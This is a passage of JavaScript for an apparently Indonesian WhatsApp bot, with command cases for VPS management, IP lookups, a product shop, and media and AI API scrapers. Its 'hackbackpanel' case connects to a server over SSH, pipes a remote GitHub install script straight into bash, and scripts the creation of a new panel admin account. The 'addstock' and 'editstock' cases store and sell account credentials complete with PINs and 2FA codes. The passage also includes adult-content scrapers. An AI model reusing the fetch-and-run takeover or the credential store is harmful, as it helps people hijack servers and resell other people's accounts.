            const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${global.apiDigitalOcean}`
                },
                body: JSON.stringify({
                    type: 'rebuild',
                    image: image
                })
            });
            if (response.ok) {
                const data = await response.json();
                m.reply(`🔄 *Rebuild VPS sedang diproses...*\n🆔 *Droplet ID:* ${dropletId}\n🖥️ *Image:* ${image}\n⏳ Mohon tunggu sekitar 1-2 menit...`);
                await new Promise(resolve => setTimeout(resolve, 60000)); 
                const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                    method: 'GET',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${global.apiDigitalOcean}`
                    }
                });

                if (vpsInfo.ok) {
                    const vpsData = await vpsInfo.json();
                    const droplet = vpsData.droplet;
                    const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
                    const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

                    let textvps = `✅ *VPS BERHASIL DIREBUILD!*\n\n`
                        + `🆔 *Droplet ID:* ${dropletId}\n`
                        + `📀 *Sistem Baru:* ${droplet.image.slug}\n`
                        + `📡 *IP VPS:* ${ipAddress}\n\n`
                        + `🔐 *Gunakan password lama atau periksa email DigitalOcean untuk login baru.*`;

                    await conn.sendMessage(m.chat, { text: textvps });
                } else {
                    m.reply('⚠️ *Gagal mendapatkan informasi VPS setelah rebuild!*');
                }
            } else {
                const errorData = await response.json();
                m.reply(`❌ *Gagal melakukan rebuild VPS:*\n${errorData.message}`);
            }
        } catch (err) {
            m.reply(`❌ *Terjadi kesalahan saat rebuild VPS:*\n${err.message}`);
        }
    };
    rebuildVPS();
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "startwings": case "configurewings": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 3) return m.reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Kata sandi atau IP tidak valid');
}).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "hackbackpanel": case "hbpanel": {
    if (!isCreator) return Reply(mess.owner)
    let t = text.split('|')
    if (t.length < 4) return m.reply("username@ipvps|pwvps|newuser|newpw")
    let [usernameWithIp, passwd, newuser, newpw] = t
    let [username, ipvps] = usernameWithIp.split('@')
    const connSettings = {
        host: ipvps,
        port: '22',
        username: username, 
        password: passwd
    }
    const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
    const ress = new Client();
    ress.on('ready', () => {
        ress.exec(command, (err, stream) => {
            if (err) throw err
            stream.on('close', async (code, signal) => {    
                let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
                await conn.sendMessage(m.chat, {text: teks}, {quoted: m})
                ress.end()
            }).on('data', async (data) => {
                await console.log(data.toString())
            }).stderr.on('data', (data) => {
                stream.write("skyzodev\n")
                stream.write("7\n")
                stream.write(`${newuser}\n`)
                stream.write(`${newpw}\n`)
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        m.reply('Kata sandi atau IP tidak valid');
    }).connect(connSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'cekip2': {
    if (!q) return m.reply(`Example:\n${prefix + command} <ip>`);

    try {
        const axios = require('axios');
        const res = await axios.get(`https://ipapi.co/${q}/json/`, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36'
            }
        });
        const data = res.data;
        if (data.reason) return m.reply(data.reason);
        const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude}`;
        const ipInfo = `
*IP Information:*
- IP Address: ${data.ip}
- Network: ${data.network}
- Version: ${data.version}
- City: ${data.city}
- Region: ${data.region} (${data.region_code})
- Country: ${data.country_name} (${data.country_code_iso3})
- Latitude: ${data.latitude}
- Longitude: ${data.longitude}
- Maps: ${mapsUrl}
- Timezone: ${data.timezone}
- Organization: ${data.org}
- ASN: ${data.asn}
- Currency: ${data.currency_name} (${data.currency})
- Country Calling Code: ${data.country_calling_code}
- Languages: ${data.languages}
- Population: ${data.country_population?.toLocaleString() || 'N/A'}
- Area: ${data.country_area?.toLocaleString() || 'N/A'} km²`;
        m.reply(ipInfo.trim());
    } catch (e) {
        console.error('IP lookup error:', e);
        m.reply('Terjadi kesalahan saat mengambil data IP.');
    }
}
break
case 'ipwhois': case 'cekip': case 'ip': {
  if (!text) return m.reply('Masukkan IP nya!\nContoh: cekip 123.45.67.89');
  try {
    const res = await fetch(`https://ipwhois.app/json/${text}`);
    const data = await res.json();
    if (data.success === false || !data.ip) return m.reply('IP tidak valid atau tidak ditemukan.');

    const info = `
*IP Checker*

• IP: ${data.ip}
• ISP: ${data.isp}
• ASN: ${data.asn}
• Provider: ${data.org}
• Negara: ${data.country} (${data.country_code})
• Region: ${data.region}
• Kota: ${data.city}
• Lokasi: ${data.latitude}, ${data.longitude}
• Timezone: ${data.timezone}
• Reverse DNS: ${data.reverse || '-'}
    `.trim();
    await m.reply(info);
  } catch (e) {
    console.log(e);
    m.reply('Gagal mengambil data IP.');
  }
}
  break
  
case "subdomain": case "subdo": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("yubi|ipserver"))
if (!text.split("|")) return m.reply(example("yubi|ipserver"))
let [host, ip] = text.split("|")
let dom = await Object.keys(global.subdomain)
let list = []
for (let i of dom) {
await list.push({
title: i, 
id: `${prefix}domain ${dom.indexOf(i) + 1} ${host}|${ip}`
})
}
await conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Domain',
          sections: [
            {
              title: 'List Domain',
              highlight_label: 'Recommended',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Domain Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'addproduk': {
if (!isCreator) return Reply(mess.owner)
    if (!text) return m.reply('Format Salah!\nKetik addproduk <code>|<nama>|<harga>|<deskripsi>\nContoh: addproduk SPO1B|Spotify Premium 1 Bulan|15000|Akses Spotify Premium selama 1 bulan');

    const [code, nama, hargaStr, deskripsi] = text.split('|').map(item => item.trim());
    if (!code || !nama || isNaN(hargaStr) || !deskripsi) {
        return m.reply('Format Salah!\nKetik addproduk <code>|<nama>|<harga>|<deskripsi>\nContoh: addproduk SPO1B|Spotify Premium 1 Bulan|15000|Akses Spotify Premium selama 1 bulan');
    }

    const harga = parseInt(hargaStr);
    if (harga <= 0) {
        return m.reply('Harga harus lebih besar dari 0.');
    }

    let produkList = [];
    try {
        const data = fs.readFileSync('source/produk.json', 'utf8');
        produkList = JSON.parse(data);
    } catch (err) {
        console.error(err);
        return m.reply('Terjadi kesalahan saat membaca data produk.');
    }

    
    const produkExist = produkList.find(produk => produk.id === code);
    if (produkExist) {
        return m.reply(`Produk dengan kode ${code} sudah ada.`);
    }

    
    const newProduk = {
        id: code,
        nama: nama,
        harga: harga,
        deskripsi: deskripsi,
        terjual: 0 
    };

    produkList.push(newProduk);

    try {
        fs.writeFileSync('source/produk.json', JSON.stringify(produkList, null, 4), 'utf8');
        m.reply(`Produk berhasil ditambahkan:\n\n` +
                `Kode: ${code}\n` +
                `Nama: ${nama}\n` +
                `Harga: ${harga}\n` +
                `Deskripsi: ${deskripsi}`);
    } catch (err) {
        console.error(err);
        m.reply('Terjadi kesalahan saat menambahkan produk.');
    }
}
break

case 'editproduk': {
if (!isCreator) return Reply(mess.owner)
    if (!text) return m.reply('Format Salah!\nKetik editproduk <kode_produk>|<nama_baru>|<harga_baru>|<deskripsi_baru>\nContoh: editproduk SPO1B|Spotify Premium 1 Bulan Baru|20000|Akses Spotify Premium selama 1 bulan (Baru)');

    const [kodeProduk, namaBaru, hargaBaruStr, deskripsiBaru] = text.split('|').map(item => item.trim());
    if (!kodeProduk || !namaBaru || isNaN(hargaBaruStr) || !deskripsiBaru) {
        return m.reply('Format Salah!\nKetik editproduk <kode_produk>|<nama_baru>|<harga_baru>|<deskripsi_baru>\nContoh: editproduk SPO1B|Spotify Premium 1 Bulan Baru|20000|Akses Spotify Premium selama 1 bulan (Baru)');
    }

    const hargaBaru = parseInt(hargaBaruStr);
    if (hargaBaru <= 0) {
        return m.reply('Harga harus lebih besar dari 0.');
    }

    let produkList = [];
    try {
        const data = fs.readFileSync('source/produk.json', 'utf8');
        produkList = JSON.parse(data);
    } catch (err) {
        console.error(err);
        return m.reply('Terjadi kesalahan saat membaca data produk.');
    }

    const produkIndex = produkList.findIndex(produk => produk.id === kodeProduk);
    if (produkIndex === -1) {
        return m.reply(`Produk dengan kode ${kodeProduk} tidak ditemukan.`);
    }

    
    produkList[produkIndex].nama = namaBaru;
    produkList[produkIndex].harga = hargaBaru;
    produkList[produkIndex].deskripsi = deskripsiBaru;

    try {
        fs.writeFileSync('source/produk.json', JSON.stringify(produkList, null, 4), 'utf8');
        m.reply(`Produk dengan kode ${kodeProduk} berhasil diperbarui:\n\n` +
                `➤ Nama Baru: ${namaBaru}\n` +
                `➤ Harga Baru: Rp ${hargaBaru.toLocaleString('id-ID')}\n` +
                `➤ Deskripsi Baru: ${deskripsiBaru}`);
    } catch (err) {
        console.error(err);
        m.reply('Terjadi kesalahan saat memperbarui produk.');
    }
}
break

case 'addstock': {
if (!isCreator) return Reply(mess.owner)
    if (!text) return m.reply('Format Salah!\nKetik addstock <kode_produk>|<email>:<password>:<profil>:<pin>:<a2f>\nContoh: addstock spo1b|user@example.com:password123:profilinfo:1234:a2fcode');

    const [idProduk, credentials] = text.split('|').map(item => item.trim());
    if (!idProduk || !credentials) {
        return m.reply('Format Salah!\nKetik addstock <kode_produk>|<email>:<password>:<profil>:<pin>:<a2f>\nContoh: addstock spo1b|user@example.com:password123:profilinfo:1234:a2fcode');
    }

    const [email, password, profil, pin, a2f] = credentials.split(':').map(item => item.trim());
    if (!email || !password || !profil || !a2f) {
        return m.reply('Format Salah!\nPastikan email, password, profil, dan a2f diisi.');
    }


    let produkList = [];
    try {
        const produkData = fs.readFileSync('source/produk.json', 'utf8');
        produkList = JSON.parse(produkData);
    } catch (err) {
        console.error('Terjadi kesalahan saat membaca data produk:', err);
        return m.reply('❌ Terjadi kesalahan saat membaca data produk.');
    }


    const produkExist = produkList.find(produk => produk.id === idProduk);
    if (!produkExist) {
        return m.reply(`❌ Kode produk "${idProduk}" tidak ditemukan di produk.json.`);
    }

    const jsonFileName = `source/${idProduk}.json`;
    let stokData = [];

 
    if (fs.existsSync(jsonFileName)) {
        try {
            const data = fs.readFileSync(jsonFileName, 'utf8');
            stokData = JSON.parse(data);
        } catch (err) {
            console.error('Terjadi kesalahan saat membaca data stok:', err);
            return m.reply('❌ Terjadi kesalahan saat membaca data stok.');
        }
    }

  
    const newStock = {
        email: email,
        password: password,
        profil: profil,
        pin: pin || null, 
        a2f: a2f
    };

    stokData.push(newStock);

    try {
        fs.writeFileSync(jsonFileName, JSON.stringify(stokData, null, 4), 'utf8');
        m.reply(`✅ Stok berhasil ditambahkan ke produk ${idProduk}:\n\n` +
                `- Email: ${email}\n` +
                `- Password: ${password}\n` +
                `- Profil: ${profil}\n` +
                `- Pin: ${pin || 'Tidak diisi'}\n` +
                `- 2FA: ${a2f}`);
    } catch (err) {
        console.error('Terjadi kesalahan saat menulis data stok:', err);
        m.reply('❌ Terjadi kesalahan saat menambahkan stok.');
    }
}
break

case "cekgempa": {
    m.reply("Sedang mengambil data gempa terkini...");
    
    try {
        const response = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
        const data = await response.json();
        
        if (!data || !data.Infogempa || !data.Infogempa.gempa) {
            return m.reply("Gagal mendapatkan data gempa dari BMKG.");
        }
        
        const gempa = data.Infogempa.gempa;
        
        let caption = `*📈 INFO GEMPA TERKINI*\n\n`;
        caption += `*Tanggal:* ${gempa.Tanggal}\n`;
        caption += `*Waktu:* ${gempa.Jam}\n`;
        caption += `*Magnitudo:* ${gempa.Magnitude}\n`;
        caption += `*Kedalaman:* ${gempa.Kedalaman}\n`;
        caption += `*Lokasi:* ${gempa.Wilayah}\n`;
        caption += `*Koordinat:* ${gempa.Lintang} ${gempa.Bujur}\n`;
        caption += `*Potensi:* ${gempa.Potensi}\n`;
        caption += `*Dirasakan:* ${gempa.Dirasakan}\n\n`;
        caption += `Sumber: BMKG (https://www.bmkg.go.id/)`;
        
        if (gempa.Shakemap) {
            const shakemapUrl = `https://data.bmkg.go.id/DataMKG/TEWS/${gempa.Shakemap}`;
            await conn.sendMessage(m.chat, {
                image: { url: shakemapUrl },
                caption: caption
            }, { quoted: m });
        } else {
            conn.sendMessage(m.chat, { text: caption }, { quoted: m });
        }
    } catch (error) {
        console.log(error);
        m.reply("Terjadi kesalahan saat mengambil data gempa.");
    }
}
break
                
                case "xhentai": {
    try {
        const axios = require("axios");
        const cheerio = require("cheerio");
        const fetch = require("node-fetch");
        async function hentaiRandom() {
            const page = Math.floor(Math.random() * 1153);
            const response = await fetch(`https://sfmcompile.club/page/${page}`);
            const htmlText = await response.text();
            const $ = cheerio.load(htmlText);
            const list = [];
            $("#primary > div > div > ul > li > article").each(function (a, b) {
                list.push({
                    title: $(b).find("header > h2").text(),
                    link: $(b).find("header > h2 > a").attr("href"),
                    category: $(b).find("header > div.entry-before-title > span > span").text().replace("in ", ""),
                    share_count: $(b).find("header > div.entry-after-title > p > span.entry-shares").text(),
                    views_count: $(b).find("header > div.entry-after-title > p > span.entry-views").text(),
                    type: $(b).find("source").attr("type") || "image/jpeg",
                    media_url: $(b).find("source").attr("src") || $(b).find("img").attr("data-src"),
                    video_link: $(b).find("video > a").attr("href") || ""
                });
            });
            return list;
        }
        let results = await hentaiRandom();
        if (results.length === 0) return m.reply("Tidak ada konten ditemukan.");
        let randomHentai = results[Math.floor(Math.random() * results.length)];
        let caption = `*🔞 Hentai Random 🔞*\n\n`
            + `📌 *Judul:* ${randomHentai.title}\n`
            + `📂 *Kategori:* ${randomHentai.category}\n`
            + `👀 *Views:* ${randomHentai.views_count}\n`
            + `🔗 *Link Sumber:* ${randomHentai.link}\n\n`;
        let mediaType = randomHentai.type.includes("video") ? "video" : "image";
        let mediaMessage = {
            caption: caption,
            [mediaType]: { url: randomHentai.media_url }
        };
        await conn.sendMessage(m.chat, mediaMessage, { quoted: m });
    } catch (error) {
        console.error("Error di case hentai:", error);
        m.reply("Terjadi kesalahan saat mengambil konten hentai.");
    }
}
break

                case "hentaivid": {
                 m.reply(mess.wait);
                  const anu = `https://api.agatz.xyz/api/hentaivid`; 
                  try { 
                  const res = await fetch(anu); 
                  const response = await res.json();
if (!response.data || response.data.length === 0) {
        return m.reply("Hasil tidak ditemukan");
    }
    
    for (let i = 0; i < Math.min(response.data.length, 10); i++) {
        const video = response.data[i];
        await conn.sendMessage(m.chat, {
            video: { url: video.video_1 },
            mimeType: 'video/mp4',
            caption: `Title: ${video.title}`
        }, { quoted: m });
    }
} catch (e) {
    console.log(e);
    await m.reply("Terjadi kesalahan dalam mengambil data.");
}
}
 break

case 'editstock': {
if (!isCreator) return Reply(mess.owner)
    if (!text) return m.reply('Format Salah!\nKetik editstock <kode_produk>|<email>|<password>:<profil>:<pin>:<a2f>\nContoh: editstock spo1b|user@example.com|newpassword:newprofil:4321:newa2f');

    const [idProduk, email, credentials] = text.split('|').map(item => item.trim());
    if (!idProduk || !email || !credentials) {
        return m.reply('Format Salah!\nKetik editstock <kode_produk>|<email>|<password>:<profil>:<pin>:<a2f>\nContoh: editstock spo1b|user@example.com|newpassword:newprofil:4321:newa2f');
    }

    const [password, profil, pin, a2f] = credentials.split(':').map(item => item.trim());
    if (!password || !profil || !a2f) {
        return m.reply('Format Salah!\nPastikan password, profil, dan a2f diisi.');
    }

    const jsonFileName = `source/${idProduk}.json`;
    let stokData = [];

    try {
        const data = fs.readFileSync(jsonFileName, 'utf8');
        stokData = JSON.parse(data);
    } catch (err) {
        console.error(err);
        return m.reply('Terjadi kesalahan saat membaca data stok.');
    }

    const stokIndex = stokData.findIndex(stock => stock.email === email);
    if (stokIndex === -1) {
        return m.reply(`Stok dengan email ${email} tidak ditemukan.`);
    }

  
    stokData[stokIndex].password = password;
    stokData[stokIndex].profil = profil;
    stokData[stokIndex].pin = pin || null; 
    stokData[stokIndex].a2f = a2f;

    try {
        fs.writeFileSync(jsonFileName, JSON.stringify(stokData, null, 4), 'utf8');
        m.reply(`Stok dengan email ${email} berhasil diperbarui:\n\n` +
                `- Email: ${email}\n` +
                `- Password: ${password}\n` +
                `- Profil: ${profil}\n` +
                `- Pin: ${pin || 'Tidak diisi'}\n` +
                `- 2FA: ${a2f}`);
    } catch (err) {
        console.error(err);
        m.reply('Terjadi kesalahan saat memperbarui stok.');
    }
}
break

case "asupan": case "cosplay": {
  m.reply(mess.wait);
  const axios = require('axios');
  let anu = `https://archive-ui.tanakadomp.biz.id/asupan/cosplay`;
  const response = await axios.get(anu, { responseType: 'arraybuffer' });
  try {
    conn.sendMessage(m.chat, {
      image: Buffer.from(response.data),
      caption: 'Done Boss'
    }, {quoted: m})
  } catch (e) {
     console.log(e)
}
}
break

case "anime": {
  m.reply(mess.wait);
  const axios = require('axios');
  let anu = `https://archive-ui.tanakadomp.biz.id/asupan/anime`;
  const response = await axios.get(anu, { responseType: 'arraybuffer' });
  try {
    conn.sendMessage(m.chat, {
      image: Buffer.from(response.data),
      caption: 'Done Boss'
    }, {quoted: m})
  } catch (e) {
     console.log(e)
}
}
break

case 'delproduk': {
if (!isCreator) return Reply(mess.owner)
    if (!text) return m.reply('Format Salah!\nKetik delproduk <kode_produk>\nContoh: delproduk SPO1B');

    const kodeProduk = text.trim();
    if (!kodeProduk) {
        return m.reply('Format Salah!\nKetik delproduk <kode_produk>\nContoh: delproduk SPO1B');
    }

    let produkList = [];
    try {
        const data = fs.readFileSync('source/produk.json', 'utf8');
        produkList = JSON.parse(data);
    } catch (err) {
        console.error(err);
        return m.reply('Terjadi kesalahan saat membaca data produk.');
    }

    const produkIndex = produkList.findIndex(produk => produk.id === kodeProduk);
    if (produkIndex === -1) {
        return m.reply(`Produk dengan kode ${kodeProduk} tidak ditemukan.`);
    }

   
    const deletedProduk = produkList.splice(produkIndex, 1)[0];

    try {
        fs.writeFileSync('source/produk.json', JSON.stringify(produkList, null, 4), 'utf8');
    } catch (err) {
        console.error(err);
        return m.reply('Terjadi kesalahan saat menyimpan data produk.');
    }

    
    const stokFilePath = `source/${kodeProduk}.json`;
    try {
        if (fs.existsSync(stokFilePath)) {
            fs.unlinkSync(stokFilePath);
        }
    } catch (err) {
        console.error(err);
        return m.reply('Terjadi kesalahan saat menghapus file stok.');
    }

    m.reply(`Produk dengan kode ${kodeProduk} berhasil dihapus:\n\n` +
            `➤ Nama: ${deletedProduk.nama}\n` +
            `➤ Harga: Rp ${deletedProduk.harga.toLocaleString('id-ID')}\n` +
            `➤ Deskripsi: ${deletedProduk.deskripsi}`);
}
break

case "carbonify": {
                    if(!text) return m.reply("_Masukan Teks..._");
                    m.reply("Mohon Tunggu Sebentar. . .")
                    const axios = require('axios');
                    let url = `https://api.siputzx.my.id/api/m/carbonify?input=${encodeURIComponent(text)}`;
                    const response = await axios.get(url, { responseType: 'arraybuffer' });
                    try {
                        conn.sendMessage(m.chat, {
                            image: Buffer.from(response.data),
                            caption: '_Done Icikbos..._'
                        }, { quoted: m })
                    } catch (e) {
                        console.log(e)
                        await m.reply("Maaf, Error")
                    }
                }
                break

case "blackbox":
case "bb": {
    let prompt = text ? text : (m.quoted ? m.quoted.text : null);
    if(!prompt) return m.reply("Halo, Mau Bertanya Apa?");
    
    await m.reply(mess.wait);
    let anu = `https://api.siputzx.my.id/api/ai/blackboxai?content=${encodeURIComponent(prompt)}`;
    let res = await fetch(anu)
    let response = await res.json(); 
    let teks = `${response.data}`
    try {
        conn.sendMessage(m.chat, {text: teks}, {quoted: m})
    } catch (e) {
        console.log(e)
        await m.reply("Error")
    }
}
break
case 'cogan': {
    try {
      const res = await fetch('https://raw.githubusercontent.com/veann-xyz/result-daniapi/main/cecan/cogan.json');
      const data = await res.json();
      if (!Array.isArray(data)) return m.reply('Data tidak valid.');
      const randomImage = data[Math.floor(Math.random() * data.length)];
      conn.sendMessage(m.chat, {
        image: { url: randomImage },
        caption: 'Nih cogan buat kamu :v'
      }, { quoted: m });
    } catch (err) {
      console.error(err);
      m.reply('Gagal mengambil data cogan.');
    }
  }
  break
case "kucing":
                case "cat": case "randomkucing": {
                await m.reply(mess.wait);
                try {
                const axios = require('axios');
                    //Mengambil Data Dari Api
                    let anu = `https://api.siputzx.my.id/api/r/cats`
                    const response = await axios.get(anu, { responseType: 'arraybuffer' });
                    //Mengambil Gambar
                    conn.sendMessage(m.chat,
                        {
                            image: Buffer.from(response.data),
                            caption: "Berhasil Mengambil"
                        }, { quoted: m })
                } catch (e) {
                    //Untuk Menampilkan Error Di Terminal
                    console.log(e)
                    //Untuk Reply Pesan Kalo Ada Error 
                    await m.reply("Error")
                }
            }
                break
                
                case "cecan": case "cn": {
    await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
    const apiEndpoints = {
        "Indonesia 🇮🇩": "https://api.siputzx.my.id/api/r/cecan/indonesia",
        "China 🇨🇳": "https://api.siputzx.my.id/api/r/cecan/china",
        "Japan 🇯🇵": "https://api.siputzx.my.id/api/r/cecan/japan",
        "Korea 🇰🇷": "https://api.siputzx.my.id/api/r/cecan/korea",
        "Thailand 🇹🇭": "https://api.siputzx.my.id/api/r/cecan/thailand",
        "Vietnam 🇻🇳": "https://api.siputzx.my.id/api/r/cecan/vietnam"
    }
    try {
    const axios = require('axios');
        let araara = new Array()
        const imagesPerCountry = 2
        for (const [country, url] of Object.entries(apiEndpoints)) {
            for (let i = 0; i < imagesPerCountry; i++) {
                try {
                    const response = await axios.get(url, { responseType: 'arraybuffer' })
                    let imgsc = await prepareWAMessageMedia(
                        { image: Buffer.from(response.data) }, 
                        { upload: conn.waUploadToServer }
                    )
                    araara.push({
                        header: proto.Message.InteractiveMessage.Header.fromObject({
                            hasMediaAttachment: true,
                            ...imgsc
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                            buttons: [{                  
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"${country} Image ${i + 1}\",\"url\":\"${url}\",\"merchant_url\":\"https://www.google.com\"}`
                            }]
                        })
                    })
                    await new Promise(resolve => setTimeout(resolve, 500))
                    
                } catch (error) {
                    console.error(`Error processing image ${i + 1} for ${country}:`, error)
                    continue
                }
            }
        }
        if (araara.length === 0) {
            throw new Error('No valid images found')
        }
        const msgii = await generateWAMessageFromContent(m.chat, {
            viewOnceMessageV2Extension: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.fromObject({
                            text: `\nKoleksi Cecan dari Berbagai Negara\n\n• Indonesia 🇮🇩\n• China 🇨🇳\n• Japan 🇯🇵\n• Korea 🇰🇷\n• Thailand 🇹🇭\n• Vietnam 🇻🇳\n`
                        }),
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                            cards: araara
                        })
                    })
                }
            }
        }, {userJid: m.sender, quoted: m})

        await conn.relayMessage(m.chat, msgii.message, { 
            messageId: msgii.key.id 
        })
        await conn.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
    } catch (error) {
        console.error('Error:', error)
        await conn.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
        return m.reply('Terjadi kesalahan saat mengambil gambar. Silahkan coba lagi.')
    }
}
break

case "wikipedia":
case "wiki": {
  if (!text) return m.reply(`Example: ${prefix + command} query`);
  try {
    let api = await fetch(`https://api.siputzx.my.id/api/s/wikipedia?query=${text}`);
    let data = await api.json();
    if (!data.status) return m.reply('Search failed! Try again later.');
    if (!data.data) return m.reply('No results found! Try searching on a search engine for more information.');
    
    let caption = `乂 *WIKIPEDIA* ◦\n\n`;
    caption += data.data.wiki;
    await conn.sendMessage(m.chat, { image: { url: data.data.thumb }, caption: caption });
  } catch (e) {
    console.log(e);
    m.reply('Error occurred while searching!');
  }
}
break

case "tiktoksearch":
case "stiktok": {
  if (!text) return m.reply(`Example: ${prefix + command} query`);
  try {
    let api = await fetch(`https://api-rest-rizzkyxofc.vercel.app/api/search/tiktoksearch?q=${text}`);
    let data = await api.json();
    if (!data.status) return m.reply('Search failed! Try again later.');
    if (data.result.length === 0) return m.reply('No videos found!');

    
    let hasil = data.result.slice(0, 15);
    for (let i = 0; i < hasil.length; i++) {
      let video = hasil[i];
      let caption = `乂 *VIDEO ${i + 1}* ◦\n\n`;
      caption += `乂 *Title* : ${video.title}\n`;
      caption += `乂 *Author* : ${video.author.nickname}\n`;
      caption += `乂 *Duration* : ${video.duration}s\n`;
      caption += `乂 *Statistics* : - Views: ${video.play_count.toLocaleString()} - Likes: ${video.digg_count.toLocaleString()} - Comments: ${video.comment_count.toLocaleString()} - Shares: ${video.share_count.toLocaleString()} - Downloads: ${video.download_count.toLocaleString()}`;
      
      await conn.sendMessage(m.chat, { video: { url: video.play }, caption: caption });
    }
  } catch (e) {
    console.log(e);
    m.reply('Error occurred while searching!');
  }
}
break
case 'ttsmp3': {
  const aiChar = {
    "nova": "nova",
    "alloy": "alloy",
    "ash": "ash",
    "coral": "coral",
    "echo": "echo",
    "fable": "fable",
    "onyx": "onyx",
    "sage": "sage",
    "shimmer": "shimmer"
  }
  if (!q) {
    let listChar = Object.keys(aiChar).map(v => `- ${v}`).join('\n')
    return m.reply(`*List Voice Character TTSMP3*\n\n${listChar}\n\nContoh:\n${prefix + command} halo,alloy`)
  }
  if (!q.includes(',')) return m.reply(`Format salah!\nContoh: ${prefix + command} halo,alloy`)
  let [text, char] = q.split(',')
  char = char.trim().toLowerCase()
  if (!Object.keys(aiChar).includes(char)) {
    return m.reply(`Karakter tidak valid!\n\nKarakter yang tersedia:\n${Object.keys(aiChar).join(', ')}`)
  }

  try {
const axios = require('axios');
    const FormData = require('form-data')
    const form = new FormData()
    form.append("msg", text)
    form.append("lang", aiChar[char])
    form.append("speed", "1.00")
    form.append("source", "ttsmp3")
    const { data } = await axios.post("https://ttsmp3.com/makemp3_ai.php", form, {
      headers: form.getHeaders()
    })
    if (!data?.URL) return m.reply("Gagal mendapatkan hasil TTS.")
    conn.sendMessage(m.chat, { audio: { url: data.URL }, mimetype: 'audio/mpeg', ptt: true }, { quoted: m })
  } catch (e) {
    m.reply(`Terjadi kesalahan: ${e.message}`)
  }
}
  break
case 'tts': case 'texttosound': {
  if (!q) return m.reply(`Contoh:\n${prefix + command} halo dunia|id\nKetik *${prefix + command} list* untuk melihat bahasa yang tersedia.`);
  if (q.toLowerCase() == 'list' || q.toLowerCase() == 'daftar') {
    const axios = require('axios');
    try {
      const res = await axios.get('https://fastrestapis.fasturl.cloud/tts/google?text=test&target=invalid').catch(e => e.response);
      const langs = res?.data?.availableLanguages;
      if (!langs) return m.reply('Gagal mengambil daftar bahasa.');
      let teks = `*Daftar Bahasa yang Didukung :*\n\n`;
      for (let code in langs) {
        teks += `• ${langs[code]} (${code})\n`;
      }
      return m.reply(teks);
    } catch (e) {
      return m.reply('Err');
    }
  }
  if (!q.includes('|')) return m.reply(`Contoh:\n${prefix + command} halo dunia|id`);
  let [text, lang] = q.split('|');
  if (!text) return m.reply('Teks tidak boleh kosong.');
  if (!lang) lang = 'id';

  try {
    const axios = require('axios');
    let url = `https://fastrestapis.fasturl.cloud/tts/google?text=${encodeURIComponent(text)}&target=${lang}`;
    const { data } = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    conn.sendMessage(m.chat, {
      audio: data,
      mimetype: 'audio/mpeg',
      ptt: true
    }, { quoted: m });
  } catch (e) {
    console.log(e.response?.data || e);
    if (e.response?.data?.error?.includes("Invalid or unsupported target")) {
      return m.reply(`Bahasa tidak didukung!\nKetik *${prefix + command} list* untuk melihat bahasa yang tersedia.`);
    }
    m.reply('Aduhh Erorr');
  }
}
break

              case "tiktokstalk": case "ttstalk": {
    if (!text) return m.reply(`Example: ${prefix + command} username`);
    try {
        let api = await fetch(`https://api-rest-rizzkyxofc.vercel.app/api/tools/tiktokstalk?user=${text}`);
        let data = await api.json();
        if (!data.status) return m.reply('User not found!');
        let caption = `乂 *TIKTOK STALK*

◦ *Name* : ${data.result.nama}
